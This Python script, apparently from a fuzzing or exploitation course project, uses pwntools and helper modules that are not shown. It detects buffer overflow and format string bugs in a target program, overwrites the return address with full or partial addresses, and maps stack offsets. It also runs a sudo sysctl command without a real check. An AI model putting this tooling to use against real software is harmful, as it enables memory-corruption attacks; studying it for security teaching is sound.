import resource
import os
import sys
from pwn import *
from pwnlib import *
from pwn import p32
import formatString
import bufferOverflow
       
def test():
    partialAddress=0x800012
    littleEndian=p32(partialAddress, endian='little')
    print(littleEndian)   
        

# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    #Set the core file limit and path
    resource.setrlimit(
    resource.RLIMIT_CORE,
    (resource.RLIM_INFINITY, resource.RLIM_INFINITY))
    stream = os.popen('echo Returned output')
    output = stream.read()
    if output != "kernel.core_pattern = core":
        os.system("sudo sysctl kernel.core_pattern=core")
    #////////////////////////////////
    
    #Read the parameters from the input file
    f = open("input.txt", "r")
    
    line = f.readline().split()
    fuzzFile=line[line.index("=") +1]
    
    line = f.readline().split()
    fuzzedProgram=line[line.index("=") +1]
    
    line = f.readline().split()
    attackAddress=int(line[line.index("=") +1],base=16)
    
    line = f.readline().split()
    partialAttackAddress=int(line[line.index("=") +1],base=16)
    
    line = f.readline().split()
    missingBytes=int(line[line.index("=") +1])
    
    line = f.readline().split()
    mutations=int(line[line.index("=") +1])
    
    inputFromFile=False
    line = f.readline().split()
    if line[line.index("=") +1] == 'True':
        inputFromFile=True
    
    checkForBufferOverflow=False
    line = f.readline().split()
    if line[line.index("=") +1] == 'True':
        checkForBufferOverflow=True
        
    detailedLog=False
    line = f.readline().split()
    if line[line.index("=") +1] == 'True':
        detailedLog=True   
        
    showFails=False
    line = f.readline().split()
    if line[line.index("=") +1] == 'True':
        showFails=True  
    #Set variables for the fuzzed program
    littleEndian=p32(attackAddress, endian='little')
    littleEndianPartial=p32(partialAttackAddress, endian='little')
    partial = littleEndianPartial[:4-missingBytes] + littleEndianPartial[4+missingBytes:]
    sys.stdout = open('log.txt', 'w')
    
    #test()
    
    if(checkForBufferOverflow):
        lenToReachReturnAddr = bufferOverflow.findMinBadLen(fuzzFile, fuzzedProgram, mutations,inputFromFile,detailedLog)
        if lenToReachReturnAddr==sys.maxsize:
            print("The bufferoverflow was not reached or recheck if the parameters are the rigth ones")
        else:
            bufferOverflow.attackSystem(lenToReachReturnAddr,fuzzedProgram,fuzzFile,littleEndian,inputFromFile,detailedLog)
            validAddresses=bufferOverflow.attackWithPartialAddress(lenToReachReturnAddr,partial, fuzzedProgram,fuzzFile,inputFromFile,detailedLog)
            print(f"A total {len(validAddresses)} of valid addresses that deflect the program:")
            print(validAddresses)
            bufferOverflow.breakSystemBeforeReturn(lenToReachReturnAddr, fuzzedProgram, fuzzFile, inputFromFile,detailedLog)
    else:
        formatParameter="%08X#"
        if formatString.checkForFormatString(fuzzedProgram,formatParameter,fuzzFile,inputFromFile,detailedLog):
            print("The program contains the format string vulnerability")
            maxLen=formatString.maxLengthOfTheFormatString(fuzzedProgram,fuzzFile,inputFromFile,detailedLog)
            lenOfString=formatString.howManyFormatParameters(fuzzedProgram,formatParameter,mutations,maxLen,fuzzFile,inputFromFile,detailedLog)
            if lenOfString!=0:
                possitionsOfValidAddresses,stringValueOfValidAddress=formatString.mapMemory(fuzzedProgram,formatParameter,lenOfString,fuzzFile,
                                                                               inputFromFile,detailedLog,showFails)
                print(f"There are {len(possitionsOfValidAddresses)} bytes that contain a valid address after trying {mutations} mutations:")
                print("They represent the relative position from the beginning of the stack of the fuzzed program:")
                print("Offset \t \t Value")
                possibleReturnAdr=[]
                for i in range(len(possitionsOfValidAddresses)):
                    if stringValueOfValidAddress[i].isascii() and stringValueOfValidAddress[i]!="":
                        possibleReturnAdr.append(possitionsOfValidAddresses[i])           
                    print(f"{possitionsOfValidAddresses[i]} \t \t \t {stringValueOfValidAddress[i]}\n")
                print(f"There are {len(possibleReturnAdr)} addresses were the Return address could reside in:")
                print(possibleReturnAdr)
        else:
            print("The program does NOT contain the format string vulnerability")
            
        
    sys.stdout.close()



